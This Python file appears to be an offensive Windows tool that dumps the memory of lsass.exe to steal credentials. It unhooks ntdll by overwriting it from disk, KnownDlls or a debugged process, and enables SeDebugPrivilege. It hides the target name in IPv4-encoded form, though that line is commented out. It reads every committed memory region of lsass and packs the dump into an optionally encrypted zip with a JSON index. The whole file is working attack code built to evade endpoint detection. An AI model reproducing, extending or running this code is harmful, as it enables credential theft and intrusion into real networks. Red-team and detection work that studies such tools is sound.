import os
import sys
import json
import ctypes
from ctypes import wintypes
import argparse
from overwrite import overwrite_disk, overwrite_knowndlls, overwrite_debugproc
import warnings
warnings.filterwarnings("ignore", category=DeprecationWarning)
import random
import string
import zipfile


# Constants
TOKEN_ADJUST_PRIVILEGES = 0x0020
TOKEN_QUERY = 0x0008
SE_PRIVILEGE_ENABLED = 0x00000002
PROCESS_VM_OPERATION = 0x8
PROCESS_VM_WRITE = 0x20
MemoryBasicInformation = 0
ProcessBasicInformation = 0 
PAGE_NOACCESS = 0x01
MEM_COMMIT = 0x00001000


# Structures
class PROCESS_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [ ("Reserved1", wintypes.LPVOID), ("PebBaseAddress", wintypes.LPVOID), ("Reserved2", wintypes.LPVOID * 2), ("UniqueProcessId", wintypes.HANDLE), ("Reserved3", wintypes.LPVOID) ]

class MEMORY_BASIC_INFORMATION(ctypes.Structure):
    _fields_ = [ ('BaseAddress', wintypes.LPVOID), ('AllocationBase', wintypes.LPVOID), ('AllocationProtect', wintypes.DWORD), ('RegionSize', ctypes.c_size_t), ('State', wintypes.DWORD), ('Protect', wintypes.DWORD), ('Type', wintypes.DWORD)]

class LUID(ctypes.Structure):
    _fields_ = [ ("LowPart", wintypes.DWORD), ("HighPart", wintypes.LONG) ]

class LUID_AND_ATTRIBUTES(ctypes.Structure):
    _fields_ = [ ("Luid", LUID), ("Attributes", wintypes.DWORD) ]

class TOKEN_PRIVILEGES(ctypes.Structure):
    _fields_ = [ ("PrivilegeCount", wintypes.DWORD), ("Privileges", LUID_AND_ATTRIBUTES * 1) ]

class CLIENT_ID(ctypes.Structure):
    _fields_ = [ ("UniqueProcess", wintypes.HANDLE), ("UniqueThread", wintypes.HANDLE) ]

class OBJECT_ATTRIBUTES(ctypes.Structure):
    _fields_ = [ ("Length", wintypes.ULONG), ("RootDirectory", wintypes.HANDLE), ("ObjectName", wintypes.LPVOID), ("Attributes", wintypes.ULONG), ("SecurityDescriptor", wintypes.LPVOID), ("SecurityQualityOfService", wintypes.LPVOID) ]

def initialize_object_attributes():
    return OBJECT_ATTRIBUTES(
        Length=ctypes.sizeof(OBJECT_ATTRIBUTES),
        RootDirectory=None,
        ObjectName=None,
        Attributes=0,
        SecurityDescriptor=None,
        SecurityQualityOfService=None
    )


# NTAPI functions
ntdll = ctypes.WinDLL("ntdll")
NtOpenProcessToken = ntdll.NtOpenProcessToken
NtOpenProcessToken.restype = wintypes.ULONG
NtOpenProcessToken.argtypes = [
    wintypes.HANDLE,
    wintypes.DWORD,
    ctypes.POINTER(wintypes.HANDLE)
]
NtAdjustPrivilegesToken = ntdll.NtAdjustPrivilegesToken
NtAdjustPrivilegesToken.restype = wintypes.ULONG
NtAdjustPrivilegesToken.argtypes = [
    wintypes.HANDLE,
    wintypes.BOOL,
    ctypes.POINTER(TOKEN_PRIVILEGES),
    wintypes.DWORD,
    ctypes.POINTER(TOKEN_PRIVILEGES),
    ctypes.POINTER(wintypes.DWORD)
]
NtOpenProcess = ntdll.NtOpenProcess
NtOpenProcess.restype = wintypes.LONG
NtOpenProcess.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.DWORD,     # DesiredAccess
    wintypes.LPVOID,    # ObjectAttributes
    wintypes.LPVOID     # ClientId
]
NtClose = ntdll.NtClose
NtClose.restype = wintypes.ULONG
NtClose.argtypes = [wintypes.HANDLE]
NtGetNextProcess = ntdll.NtGetNextProcess
NtGetNextProcess.restype = wintypes.ULONG
NtGetNextProcess.argtypes = [
    wintypes.HANDLE,
    wintypes.ULONG,
    wintypes.ULONG,
    wintypes.ULONG,
    ctypes.POINTER(wintypes.HANDLE)
]
NtQueryInformationProcess = ntdll.NtQueryInformationProcess
NtQueryInformationProcess.restype = wintypes.LONG
NtQueryInformationProcess.argtypes = [wintypes.HANDLE, wintypes.ULONG, wintypes.HANDLE, wintypes.ULONG, wintypes.PULONG]
NtReadVirtualMemory = ntdll.NtReadVirtualMemory
NtReadVirtualMemory.restype = wintypes.LONG
NtReadVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.LPVOID,    # Buffer
    wintypes.ULONG,     # NumberOfBytesToRead
    wintypes.PULONG     # NumberOfBytesRead
]
NtQueryVirtualMemory = ntdll.NtQueryVirtualMemory
NtQueryVirtualMemory.restype = wintypes.DWORD
NtQueryVirtualMemory.argtypes = [
    wintypes.HANDLE,    # ProcessHandle
    wintypes.LPVOID,    # BaseAddress
    wintypes.DWORD,     # MemoryInformationClass
    wintypes.LPVOID,    # MemoryInformation
    wintypes.ULONG,     # MemoryInformationLength
    wintypes.LPVOID     # ReturnLength (optional)
]


def get_random_string(length):
    characters = string.ascii_letters + string.digits
    random_string = ''.join(random.choices(characters, k=length))
    return random_string


def open_process(pid):
    process_handle = wintypes.HANDLE()
    obj_attributes = initialize_object_attributes()
    client_id = CLIENT_ID(
        UniqueProcess=ctypes.c_void_p(pid),
        UniqueThread=None
    )
    status = NtOpenProcess(
        ctypes.byref(process_handle),
        (PROCESS_VM_OPERATION | PROCESS_VM_WRITE),
        ctypes.byref(obj_attributes),
        ctypes.byref(client_id)
    )
    if status != 0 or not process_handle:
        print("[-] Could not open handle to the process. Not running as administrator maybe?")
        sys.exit(0)
    return process_handle


def get_proc_name_from_handle(process_handle):
    process_basic_information_size = 48
    peb_offset = 0x8
    processparameters_offset = 0x20
    commandline_offset = 0x68
    
    return_length = wintypes.ULONG()   
    process_information = PROCESS_BASIC_INFORMATION()
    return_length = wintypes.ULONG()
    ntstatus = NtQueryInformationProcess(
        process_handle,
        ProcessBasicInformation,
        ctypes.byref(process_information),
        ctypes.sizeof(process_information),
        ctypes.byref(return_length)
    )

    if ntstatus != 0:
        raise ctypes.WinError()

    # Get PEB->ProcessParameters
    processparameters_pointer = process_information.PebBaseAddress + processparameters_offset
    processparameters_address = read_remoteintptr(process_handle, processparameters_pointer)

    # Get ProcessParameters->CommandLine
    commandline_pointer = processparameters_address + commandline_offset
    commandline_address = read_remoteintptr(process_handle, commandline_pointer)
    commandline_value = read_remoteWStr(process_handle, commandline_address)
    return commandline_value


def GetProcessByName(proc_name):
    MAXIMUM_ALLOWED = 0x02000000    
    aux_handle = wintypes.HANDLE(0)
    while True:
        status = NtGetNextProcess(aux_handle, MAXIMUM_ALLOWED, 0, 0, ctypes.byref(aux_handle))
        if status != 0:
            break
        try:
            aux_proc_name = get_proc_name_from_handle(aux_handle)
            if aux_proc_name.lower() == proc_name.lower():
                return aux_handle
        except Exception as e:
            pass
    return wintypes.HANDLE(0)


def enable_debug_privilege():
    current_process = open_process(os.getpid())
    token_handle = wintypes.HANDLE()

    try:
        ntstatus = NtOpenProcessToken(current_process, TOKEN_QUERY | TOKEN_ADJUST_PRIVILEGES, ctypes.byref(token_handle))
        if ntstatus != 0:
            print(f"[-] Error calling NtOpenProcessToken. NTSTATUS: 0x{ntstatus:X}")
            raise ctypes.WinError()

        luid = LUID()
        luid.LowPart = 20
        luid.HighPart = 0
        token_privileges = TOKEN_PRIVILEGES()
        token_privileges.PrivilegeCount = 1
        token_privileges.Privileges[0].Luid = luid
        token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED

        ntstatus = NtAdjustPrivilegesToken(token_handle, False, ctypes.byref(token_privileges), ctypes.sizeof(token_privileges), None, None)
        if ntstatus != 0:
            print(f"[-] Error calling NtAdjustPrivilegesToken. NTSTATUS: 0x{ntstatus:X}")
            raise ctypes.WinError()

        print("[+] SeDebugPrivilege enabled successfully.")

    finally:
        if token_handle:
            NtClose(token_handle)


def read_remoteintptr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(8)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            8,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return

    read_bytes = buffer.raw[:bytes_read.value][::-1]
    read_int = int(str((read_bytes).hex()),16)
    return read_int 


def read_remoteWStr(process_handle, mem_address):
    buffer = ctypes.create_string_buffer(256)
    bytes_read = wintypes.ULONG(0)
    status = NtReadVirtualMemory(
            process_handle,
            mem_address,
            buffer,
            256,
            ctypes.byref(bytes_read)
        )

    if status != 0:
        return ""

    read_bytes = buffer.raw[:bytes_read.value]
    index = read_bytes.find(b'\x00\x00')
    unicode_str = (read_bytes[:index].decode('unicode-escape'))
    unicode_str_clean = "".join(char for char in unicode_str if char.isprintable())
    return unicode_str_clean 


def decodeIPv4(byte_strings):
    byte_array = bytearray()
    for byte_string in byte_strings:
        bytes = map(int, byte_string.split('.'))
        byte_array.extend(bytes)
    return byte_array.decode('utf-8').rstrip('\0')


def get_args():
    parser = argparse.ArgumentParser()
    parser.add_argument('-o', '--option', required=False, action='store', help='Option for library overwrite: \"disk\", \"knowndlls\" or \"debugproc\"')
    parser.add_argument('-p', '--path', required=False, default="", action='store', help='Path to ntdll file in disk (for \"disk\" option) or program to open in debug mode (\"debugproc\" option)')
    parser.add_argument('-zp', '--zip_pwd', required=False, default="", action='store', help='Password for zip file')
    my_args = parser.parse_args()
    return my_args


def create_nonpwd_zip(zip_name, files_content):
    with zipfile.ZipFile(zip_name, 'w') as zipf:
        for f in files_content:
            zipf.writestr(f['filename'], f['content'])


def create_pwd_zip(output_zip, password, file_list):
    import pyzipper
    with pyzipper.AESZipFile(output_zip, 'w', compression=pyzipper.ZIP_DEFLATED, encryption=pyzipper.WZ_AES) as zf:
        zf.setpassword(password.encode('utf-8'))
        for file_info in file_list:
            zf.writestr(file_info['filename'], file_info['content'])


def main():
    # Ntdll overwrite
    args = get_args()
    option = args.option
    if option == "disk":
        path = "C:\\Windows\\System32\\ntdll.dll"
        if args.path != "":
            path = args.path
        overwrite_disk(path)
    elif option == "knowndlls":
        overwrite_knowndlls()
    elif option == "debugproc":
        path = "c:\\windows\\system32\\calc.exe"
        if args.path != "":
            path = args.path
        overwrite_debugproc(path)
    else:
        pass

    # Get SeDebugPrivilege 
    enable_debug_privilege()

    # Decode process name to "C:\\WINDOWS\\system32\\lsass.exe"
    # process_name_ipv4_encoded  = ["67.58.92.87", "73.78.68.79", "87.83.92.115", "121.115.116.101", "109.51.50.92", "108.115.97.115", "115.46.101.120", "101.0.0.0"]
    # process_name = decodeIPv4(process_name_ipv4_encoded)
    process_name = "c:\\windows\\system32\\lsass.exe"
    
    # Get process handle
    process_handle = GetProcessByName(process_name)
    print("[+] Process handle: \t" + str(process_handle.value))
    if process_handle.value is None:
        print("[-] It was not possible to get a process handle")
        sys.exit(0)

    # Loop memory regions
    mem_address = 0
    proc_max_address_l = 0x7FFFFFFEFFFF
    mem64list_arr = []
    files_content = []

    while (mem_address < proc_max_address_l):
        memory_info = MEMORY_BASIC_INFORMATION()
        memory_info_size = ctypes.sizeof(memory_info)
        return_length = ctypes.c_size_t()

        status = NtQueryVirtualMemory(
            process_handle,
            mem_address,
            MemoryBasicInformation,
            ctypes.byref(memory_info),
            memory_info_size,
            ctypes.byref(return_length)
        )

        if memory_info.Protect != PAGE_NOACCESS and memory_info.State == MEM_COMMIT:
            buffer = ctypes.create_string_buffer(memory_info.RegionSize)
            bytes_read = wintypes.ULONG(0)
            status = NtReadVirtualMemory(
                process_handle,
                memory_info.BaseAddress,
                buffer,
                memory_info.RegionSize,
                ctypes.byref(bytes_read)
            )

            if status == 0:
                memdump_filename = get_random_string(9) + "." + get_random_string(3)
                #with open(memdump_directory + "\\" + memdump_filename, 'wb') as file:
                #    file.write(buffer.raw)
                files_content.append({"filename": memdump_filename, "content": buffer.raw})
                mem64list_arr.append({"field0": memdump_filename, "field1": hex(mem_address), "field2": memory_info.RegionSize})
    
        mem_address += memory_info.RegionSize

    # Close process handle
    NtClose(process_handle)

    file_name = "barrel.json"
    zip_name  = "barrel.zip"
    zip_pwd   = args.zip_pwd #"oogie-boogie"

    with open(file_name, 'w', encoding='utf-8') as f:
            json.dump(mem64list_arr, f, ensure_ascii=False)
    print("[+] File " + file_name + " generated.")
    if zip_pwd != "":
        create_pwd_zip(zip_name, zip_pwd, files_content)
    else:
        create_nonpwd_zip(zip_name, files_content)
    print("[+] File " + zip_name + " generated.")


if __name__ == "__main__":
    main()